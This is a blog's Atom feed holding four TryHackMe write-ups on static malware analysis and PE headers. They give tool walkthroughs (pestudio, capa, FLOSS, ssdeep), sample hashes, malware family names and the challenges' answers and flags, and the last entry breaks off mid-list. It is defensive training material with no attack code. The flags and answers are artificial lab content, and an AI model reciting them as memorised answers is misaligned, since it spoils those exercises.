<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://nonohm.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://nonohm.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-05-15T21:13:54+00:00</updated><id>https://nonohm.github.io/feed.xml</id><title type="html">NonoHM</title><subtitle>Welcome to my personnal website. I am currently a 2nd year student in the &quot;BUT Réseaux et Télécommunications&quot; program. I like doing sports and music besides learning new things in IT. </subtitle><entry><title type="html">THM CTF MalBuster</title><link href="https://nonohm.github.io/blog/2024/THM-CTF-MalBuster/" rel="alternate" type="text/html" title="THM CTF MalBuster"/><published>2024-05-10T14:05:37+00:00</published><updated>2024-05-10T14:05:37+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-CTF-MalBuster</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-CTF-MalBuster/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we’ll be charged of analyzing malware samples provided by the SOC Team. We will mainly use FLARE VM (sometimes REMnux) and our knowledge learned in <a href="https://tryhackme.com/room/dissectingpeheaders">Dissecting PE Headers</a> and <a href="https://tryhackme.com/room/staticanalysis1">Basic Static Analysis</a>.</p> <h2 id="task-2---challenge-questions">Task 2 - Challenge Questions</h2> <p>Malware samples are located in <em>Desktop\Samples</em>.</p> <p><strong>Based on the ARCHITECTURE of the binary, is malbuster_1 a 32-bit or a 64-bit application? (32-bit/64-bit)</strong></p> <p>To retrieve this information, we will use <em>pestudio</em> to investigate into PE Headers. On FLARE VM, <em>pestudio</em> is available into <em>Desktop\FLARE\Utilities</em>.</p> <p>When we open this file with the utility, we are directly welcomed with interesting information, including the CPU architecture of the application.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/HyFZg9oGR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="pestudio malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">32-bit</code></em></p> <p><strong>What is the MD5 hash of malbuster_1?</strong></p> <p>Using the same tab, we are able to know the md5 of the file.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4348DA65E4AEAE6472C7F97D6DD8AD8F</code></em></p> <p><strong>Using the hash, what is the number of detections of malbuster_1 in VirusTotal?</strong></p> <p>Using the provided md5 hash on virustotal, we are able to see that malware is a <code class="language-plaintext highlighter-rouge">trojan.zbot/razy</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/rJMWZqjfC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="virustotal malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">58</code></em></p> <p><strong>Based on VirusTotal detection, what is the malware signature of malbuster_2 according to Avira?</strong></p> <p>To obtain the Avira’s malware signature, we have to go through the same steps as before.</p> <p>The md5 hash provided by pestudio is <em>1D7EBED1BAECE67A31CE0A17A0320CB2</em>.</p> <p>By putting this value on Virustotal, we obtain the following results:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Sy-mT5jM0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Virustotal malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">HEUR/AGEN.1306860</code></em></p> <p><strong>malbuster_2 imports the function <code class="language-plaintext highlighter-rouge">_CorExeMain</code>. From which DLL file does it import this function?</strong></p> <p>According to <em>pestudio</em>, we can see that function comes from .NET Runtime Execution Engine.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Ska-EssMA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Imported libraries malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/S1SxVjiGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Functions malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">mscoree.dll</code></em></p> <p><strong>Based on the VS_VERSION_INFO header, what is the original name of malbuster_2?</strong></p> <p>On <em>pestudio</em>, we can find this header in the <em>version</em> tab.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/S18s8sszR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Version malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">7JYpE.exe</code></em></p> <p><strong>Using the hash of malbuster_3, what is its malware signature based on abuse.ch?</strong></p> <p>We retrieve the executable’s md5 hash on <em>pestudio</em> and then we copy it into abuse.ch.</p> <p>This is what we get in return:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Sksq02hM0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="abuse.ch malbuster_3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Trickbot</code></em></p> <p><strong>Using the hash of malbuster_4, what is its malware signature based on abuse.ch?</strong></p> <p>By doing the same steps, this is what we get from abuse.ch:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/ryVMJanGR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="abuse.ch malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">ZLoader</code></em></p> <p><strong>What is the message found in the DOS_STUB of malbuster_4?</strong></p> <p>By searching in the DOS Stub, we find that the message is a bit different than usual:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/HkpPlT3MA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="DOS Stub malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>*Answer: <code class="language-plaintext highlighter-rouge">This Salfram cannot be run in DOS mode</code></p> <p><strong>malbuster_4 imports the function <code class="language-plaintext highlighter-rouge">ShellExecuteA</code>. From which DLL file does it import this function?</strong></p> <p>We can retrieve the imported dlls and functions in the <em>Imports</em> tab in <em>pe-bear</em>. (<em>pestudio</em> could not work)</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/B1P3zp3z0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Imports malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">shell32.dll</code></em></p> <p><strong>Using capa, how many anti-VM instructions were identified in malbuster_1?</strong></p> <p>Using <code class="language-plaintext highlighter-rouge">capa Samples/malbuster_1</code>:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/BJxl963MA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Capa was not able to retrieve how many anti-VM instructions.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3</code></em></p> <p><strong>Using capa, which binary can log keystrokes?</strong></p> <p>After testing each sample, this is what we get on <em>malbuster_3</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/BJRd5pnz0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_3</code></em></p> <p><strong>Using capa, what is the MITRE ID of the DISCOVERY technique used by malbuster_4?</strong></p> <p>This is what we get after using capa on the <em>malbuster_4</em> sample:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/SJkfjThGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">T1083</code></em></p> <p><strong>Which binary contains the string GodMode?</strong></p> <p>By testing each sample with <code class="language-plaintext highlighter-rouge">strings -f malbuster_* | grep GodMode</code>, we can retrieve in which binary this string is present:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/B1Vh363fC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="string GodMode" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_2</code></em></p> <p><strong>Which binary contains the string Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)?</strong></p> <p>We use the same process as before but here we use <em>Mozilla</em> as the keyword.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/ByhUTanzC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="string Mozilla" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_1</code></em></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Basic Static Analysis</title><link href="https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis/" rel="alternate" type="text/html" title="THM Basic Static Analysis"/><published>2024-05-01T20:32:29+00:00</published><updated>2024-05-01T20:32:29+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <h3 id="learning-objectives">Learning Objectives</h3> <p>The first step in analyzing malware is generally to look at its properties without running it by doing static analysis. Here, we will cover the following topics:</p> <ul> <li>Lab setup for malware analysis</li> <li>Searching for strings in a malware</li> <li>Fingerprinting malware through hashes</li> <li>Signature-based detection mechanisms</li> <li>Extracting useful information from the PE header</li> </ul> <h2 id="task-2---lab-setup">Task 2 - Lab Setup</h2> <p>Because by analyzing malware is risky and often destructive, we must set a proper environment before it damages our envrionment. Therefore, we need to create a lab setup to analyze them.</p> <p>To make it alive, we are using here Virtual Machines because of its ability to save the state of the machine and revert as well as its flexibility. VMs are created using <a href="https://www.virtualbox.org/">Oracle VirtualBox</a> or <a href="https://www.vmware.com/products/workstation-pro.html">VMWare Workstation</a>.</p> <p>Two distributions are mainly used to make Reverse Engineering, <a href="https://github.com/mandiant/flare-vm?tab=readme-ov-file">FLARE VM</a> and <a href="https://docs.remnux.org/install-distro/get-virtual-appliance">REMnux</a>. FLARE VM is a Windows Based VM, but it is given as a toolkit script and REMnux is a Linux based malware analysis distro.</p> <h2 id="task-3---string-search">Task 3 - String search</h2> <p>A string search can provide useful information of a malware by identifying important pieces of strings.</p> <p>String search, regardless of the file type, identifies sequences of ASCII/unicode character followed by a null character. Werever it finds such a sequence, it reports that as a string but many sequences of bytes can fulfill the criteria mentionned above. Many values are not useful and a string search can provide many False Positives like memory addresses, asm instructions… and they should be ignored.</p> <p>Because an analyst has to differentiate strings of interest from garbage ones, the following artefacts can be used as Indicators of Compromise (IOCs):</p> <ul> <li>Windows Functions and APIs for providing possible functionality of the malware</li> <li>IP Addresses, URL or domain like for a C2 server</li> <li>Miscellaneous strings</li> </ul> <h3 id="basic-string-search">Basic String Search</h3> <p>String searches can be made using the <code class="language-plaintext highlighter-rouge">strings</code> utility that comes pre-installed in linux or <code class="language-plaintext highlighter-rouge">strings.exe</code> in the SysInternals Suite for Windows. Several tools like Cyberchef or PEStudio allows us the ability to make string searches and more.</p> <h3 id="obfuscated-strings">Obfuscated strings</h3> <p>Beceause string searches can disrupt malware propagation and infection, malware authors deploy obfuscation techniques to obfuscate key parts of their code. These often make a string search ineffective.</p> <p><a href="https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings">FLOSS</a> for FireEye Labs Obfuscated String Solver can be sometimes useful to deobfuscate and extract strings that would not normally</p> <h3 id="question">Question</h3> <p><strong>On the Desktop in the attached VM, there is a directory named ‘mal’ with malware samples 1 to 6. Use floss to identify obfuscated strings found in the samples named 2, 5, and 6. Which of these samples contains the string ‘DbgView.exe’?</strong></p> <p>By using FLOSS on these samples with the command:</p> <pre><code class="language-cmd">floss --no-static-strings &lt;file&gt;
</code></pre> <p><em>Answer: <code class="language-plaintext highlighter-rouge">6</code></em></p> <h2 id="task-4---fingerprinting-malware">Task 4 - Fingerprinting malware</h2> <p>When analyzing malware, it is often required to identify unique malware and differentiate them from each other. Because file names can be easily canged, hashes are a good option because they create a unique fixed-length indentifier.</p> <p>These functions are the most common used methods to create a file hash. However, the first two are now considered insecure because they can produce the same hash for multiple inputs.</p> <ul> <li>Md5sum</li> <li>Sha1sum</li> <li>Sha256sum</li> </ul> <h3 id="finding-similar-files-using-hashes">Finding Similar files using hashes</h3> <p>We have seen that hashes are unique and even a slight change can modify a hash’s content. Though, some types of hashes can help identify similarities among different files.</p> <p><strong>Imphash</strong></p> <p><a href="https://www.mandiant.com/resources/blog/tracking-malware-import-hashing">Imphash</a> stands for <em>import hash</em> and it is a hash of the function calls/libraries that a malware sample imports and the order in which these libraries are present in the sample. This helps identify samples from the same threat groups of performing similar activities.</p> <p>Imphash of a program can be viewed in PEstudio and similar samples can be identified in <a href="https://bazaar.abuse.ch/browse.php">Malware Bazaar</a>.</p> <p><strong>Fuzzy Hashes/SSDEEP</strong></p> <p>A fuzzy hash is a Context Triggered Piecewise Hash (CTPH). This hash is calculates by dividing a file into pieces and calculating the hashes of the different pieces. This method creates multiple inputs with similar sequences of bytes.</p> <p><code class="language-plaintext highlighter-rouge">ssdeep</code> or CyberChef are utilities that can calculate a file’s fuzzy hash.</p> <pre><code class="language-cmd">ssdeep &lt;file&gt; # Calculate a file's fuzzy hash
ssdeep -l -r -d &lt;directory&gt; # Match files recursively with similar fuzzy hashes 
</code></pre> <h3 id="questions">Questions</h3> <p><strong>In the samples located at <code class="language-plaintext highlighter-rouge">Desktop\mal\</code> directory in the attached VM, which of the samples has the same imphash as file 3?</strong></p> <p>By running <code class="language-plaintext highlighter-rouge">ssdeep -d ../mal/*</code>:</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Using the ssdeep utility, what is the percentage match of the above-mentioned files?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">93</code></em></p> <h2 id="task-5---signature-based-detection">Task 5 - Signature-based detection</h2> <p>We have learnt how hashes could identify identical files and identify file similarities using imphash and ssdeep. Sometimes, we just need to identify if a file contains the information of interesst though.</p> <h3 id="signatures">Signatures</h3> <p>Signatures are a way to idetify a particular type of content because signatures can be considered as a pattern that might be found inside a file. The pattern is often a sequence of bytes in a file, with or without any context.</p> <p><strong>Yara rules</strong></p> <p>Yara rules are a type of signature-based rule. It can identify information based on binary and textual patterns such as hex or strings. However, even if <a href="https://github.com/Yara-Rules/rules">community rules</a> or homebrew rules hits doesn’t mean the file is malicious. It is important to know the properties of the rule.</p> <p><strong>Proprietary Signatures - Antivirus Scans</strong></p> <p>Proprietary signatures have the advantage of having less chances of False Positives (a signature hits a non-malicious file) but this might lead to few False Negatives (a malicious file does not hit any signature).</p> <p>That is why it is important to get a verdict from multiple products like with <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a>. When analyzing a sensitive file, it is important to search hash on Virustotal or importing it on non-reporting scanning service (which Virustotal does not do).</p> <p><strong>Capa</strong></p> <p><a href="https://github.com/mandiant/capa">Capa</a> is an FOSS tool to help identify the capabilities found in a PE file. It reads the file and tries to identifies the behavior based on signatures such as imports, strings, mutexes…</p> <p>Capa identifies and maps capabilities according to the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework and <a href="https://github.com/MBCProject/mbc-markdown">Malware Behavior Catalog</a>.</p> <p>The syntax is the following:</p> <pre><code class="language-cmd">capa &lt;file&gt;
capa -h
</code></pre> <h3 id="questions-1">Questions</h3> <p>Using the file in <code class="language-plaintext highlighter-rouge">Desktop\mal\4</code>:</p> <p><strong>How many matches for anti-VM execution techniques were identified in the sample?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">86</code></em></p> <p><strong>Does the sample have to capability to suspend or resume a thread? Answer with Y for yes and N for no.</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Y</code></em></p> <p><strong>What MBC behavior is observed against the MBC Objective ‘Anti-Static Analysis’?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Disassembler Evasion::Argument Obfuscation [B0012.001]</code></em></p> <p><strong>At what address is the function that has the capability ‘Check HTTP Status Code’?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x486921</code></em></p> <h2 id="task-6---leveraging-the-pe-header">Task 6 - Leveraging the PE header</h2> <p>Because the covered techniques, even though they provide information regardless of the file type of the malware, don’t always provide us deterministic information; PE Heasers provide a more deterministic characteristics of the sample, which tells us more about it.</p> <h3 id="pe-header">PE Header</h3> <p>PE files consist of a sequence of bits stored on the disk in a specific format. The initial bits of the PE file define the characteristics of it and explains us how to read the contained data. This initial part is called the PE Header.</p> <p>PEStudio can help us dissect PE Header.</p> <p><strong>Linked Libraries, imports and functions</strong></p> <p>A PE File does not contain all of its code to perform tasks and reuses code from different liraries. The information about what library (.dll) is imported, is contained in the PE Header and can give us a rough idea of the functionnality of the malware sample.</p> <p><strong>Identifying Packed Executables</strong></p> <p>Static analysis can provide a lot of informatio about the executable, so in order to face this problem, obfuscation is often used to block analysis. One way of doing this is by packing the original sample inside a shell-type code that obfuscates the proerties of the actual malware sample.<br/> Packed executables are identifiable by analyzing ressource sections and entropies.</p> <h3 id="questions-2">Questions</h3> <p><strong>Open the sample Desktop\mal\4 in PEstudio. Which library is blacklisted?</strong></p> <figure> <picture> <img src="/assets/img/images/thm_basic_static_analysis/r1lS4FbzR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="PEStudio Libraries Import" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">rpcrt4.dll</code></em></p> <p><strong>What does this DLL do?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Remote Procedure Call Runtime</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>In this room, we have learned about:</p> <ul> <li>Lab setup for malware analysis</li> <li>Searching for strings and obfuscated strings</li> <li>Fingerprinting malware using hashes and identifying similar samples using imphash and ssdeep</li> <li>Using signature-based detection like Yara and Capa</li> <li>Identifying artifacts from the PE header</li> </ul>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Basic Malware RE</title><link href="https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE/" rel="alternate" type="text/html" title="THM Basic Malware RE"/><published>2024-04-24T17:44:02+00:00</published><updated>2024-04-24T17:44:02+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE/"><![CDATA[<h2 id="task-2---stringschallenge-1">Task 2 - Strings::Challenge 1</h2> <p>After downloading the provided executable, we need to find a certain flag which a md5 hash of it gets generated.</p> <p>We firstly try viewing the executable using <code class="language-plaintext highlighter-rouge">strings strings1.exe_</code>.</p> <pre><code class="language-raw">!This program cannot be run in DOS mode.
Rich
.text
`.rdata
@.data
.CRT
@.rsrc
@.reloc
QZ^&amp;
QXRhl
TAhR
j0hT
FLAG{THE-DEPICTED-THE-IMPORTANT-THE}
FLAG{INCLUDES-COLLECTIVE-AND-SOCIALIST-INQUIRY}
FLAG{LAW-IDEOLOGICAL-INTO-THE-THE}
FLAG{COMPETENCE-ISSUE-PERSONAL-THE-LAW}
FLAG{MATTERS-POLITICAL-DETERMINATION-ITS-SOCIALIST}
FLAG{BODIES-PROMOTE-NATIONWIDE-COLLECTIVE-SOVIET}
...
</code></pre> <p>However, as we can see, there is a plenty of flags available, and finding it would be a hassle.</p> <p>Using x64dbg, we can go to the EntryPoint of the executable, and then find the executable that gets hashed.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/rkcQas8-C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x64dbg flag hash" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{CAN-I-MAKE-IT-ANYMORE-OBVIOUS}</code></em></p> <h2 id="task-3---strings--challenge-2">Task 3 - Strings :: Challenge 2</h2> <p>Here, we directly putting our executable in x64dbg. When we reach the entrypoint of our executable, we can directly see each character of the flag that is being pushed into <code class="language-plaintext highlighter-rouge">ebp</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/rJlh_q1G0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Flag characters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question-1">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{STACK-STRINGS-ARE-BEST-STRINGS}</code></em></p> <h2 id="task-4---strings--challenge-3">Task 4 - Strings :: Challenge 3</h2> <p>In this case, the problem is a bit more complex so we will use ghidra instead of x64dbg.</p> <p>When we look into our program, we can see this:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/H1Bt821zC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Decompiled strings 3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We can see that we have <code class="language-plaintext highlighter-rouge">FindRessourceA</code> and <code class="language-plaintext highlighter-rouge">LoadStringA</code>.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">LoadStringA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">UINT</span>      <span class="n">uID</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>          <span class="n">LPSTR</span>     <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="kt">int</span>       <span class="n">cchBufferMax</span>
<span class="p">);</span>

<span class="n">HRSRC</span> <span class="nf">FindResourceA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">LPCSTR</span>  <span class="n">lpName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">LPCSTR</span>  <span class="n">lpType</span>
<span class="p">);</span>
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">FindResourceA</code>: Searches for a resource in a Windows executable file. Here it searches in this program for “rc.rc” but it doesn’t seem to have a partucal purpose.</li> <li><code class="language-plaintext highlighter-rouge">LoadStringA</code>: Loads a string resource from a Windows executable file into memory. Here, it searches for a string with id 0x110 (272 in decimal) and returns the pointer address of where it has been copied.</li> </ul> <p>Now, our goal is to find a string associated with this ID in the .rsrc string stable.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/ryprs3yGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra challenge 3 .rsrc" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question-2">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}</code></em></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 2 - Strings::Challenge 1]]></summary></entry><entry><title type="html">THM Dissecting PE Headers</title><link href="https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers/" rel="alternate" type="text/html" title="THM Dissecting PE Headers"/><published>2024-04-23T19:48:06+00:00</published><updated>2024-04-23T19:48:06+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In Windows, <code class="language-plaintext highlighter-rouge">.exe</code> files stands for executable files. It contains code that can be executed by the machine. An executable file is also called a portable Executable (PE) file. A PE file is a Common object File Format (COFF) data structure. The COFF consists in Windows of PE files and DLL and in Linux, it is shared objects and ELF files.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>In this room, we’ll review the following:</p> <ul> <li>Understanding the different headers in a PE file</li> <li>Learning how to read PE headers</li> <li>Identify packed executables</li> <li>Use the information from PE headers to analyze malware</li> </ul> <h2 id="task-2---overview-of-pe-headers">Task 2 - Overview of PE Headers</h2> <p>A PE executable is like other type of data, a combination of bits and when looking into it using an Hex editor, we can see a bunch of random hex chars. These are instructions for Windows to execute the file.</p> <p>In this room, we will use <em>wxHexEditor</em> and <em>pe-tree</em> to visualize better a PE header structure.</p> <p>The most impotrant headers are:</p> <ul> <li>IMAGE_DOS_HEADER</li> <li>IMAGE_NT_HEADERS <ul> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> <li>IMAGE_SECTION_HEADER</li> <li>IMAGE_IMPORT_DESCRIPTOR</li> </ul> </li> </ul> <p>These headers are the data type STRUCT in C, which is a user-defined data type that combines different types of data elements into a single variable. Thus, to understand each header, we need to go through documentation.</p> <h3 id="question">Question</h3> <p><strong>What data type are the PE headers</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">STRUCT</code></em></p> <h2 id="task-3---image_dos_header-and-dos_stub">Task 3 - IMAGE_DOS_HEADER and DOS_STUB</h2> <p>We are using <em>pe-tree</em> with the given sample <em>redline</em>.</p> <h3 id="image_dos_header">IMAGE_DOS_HEADER</h3> <p>The IMAGE_DOS_HEADER consists of the first 64 bytes of the PE file. In <em>pe tree</em>, the values are shown in little endian format; the least significant bytes are shown first (the ones in right).</p> <p>LE: <code class="language-plaintext highlighter-rouge">0x1020304050</code> BE: <code class="language-plaintext highlighter-rouge">Ox5040302010</code></p> <p>The first thing we can understand is <code class="language-plaintext highlighter-rouge">MZ</code>, which stands for Mark Zbikowski (one of the architect of this format), and it is the character identifying the PE format. This signature is also called <code class="language-plaintext highlighter-rouge">e_magic</code> and has a value of <code class="language-plaintext highlighter-rouge">0x5a4d</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Hy3M6urbR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_DOS_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The last value called <code class="language-plaintext highlighter-rouge">e_lfanew</code>, has a value of <code class="language-plaintext highlighter-rouge">0x000000d8</code> and denotes the address where IMAGE_NT_HEADERS start.</p> <h3 id="dos_stub">DOS_STUB</h3> <p>The DOS_STUB is just after the IMAGE_DOS_HEADER and is mainly used to contain the piece of code if the PE file is incompatible with the system.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/SJH_COSZA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="DOS_STUB Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions">Questions</h3> <p><strong>How many bytes are present in the IMAGE_DOS_HEADER?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">64</code></em></p> <p><strong>What does MZ stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Mark Zbikowski</code></em></p> <p><strong>In what variable of the IMAGE_DOS_HEADER is the address of IMAGE_NT_HEADERS saved?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">e_lfanew</code></em></p> <p><strong>In the attached VM, open the PE file Desktop/Samples/zmsuz3pinwl in pe-tree. What is the address of IMAGE_NT_HEADERS for this PE file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x000000f8</code></em></p> <h2 id="task-4---image_nt_headers">Task 4 - IMAGE_NT_HEADERS</h2> <p>Here, we will focus on the different parts of <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">IMAGE_NT_HEADERS</a>, containing vital information related to the PE file.</p> <h3 id="nt_headers">NT_HEADERS</h3> <p>NT_HEADERS consist of:</p> <ul> <li>Signature: Contains <code class="language-plaintext highlighter-rouge">PE</code> keyword in ASCII</li> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> 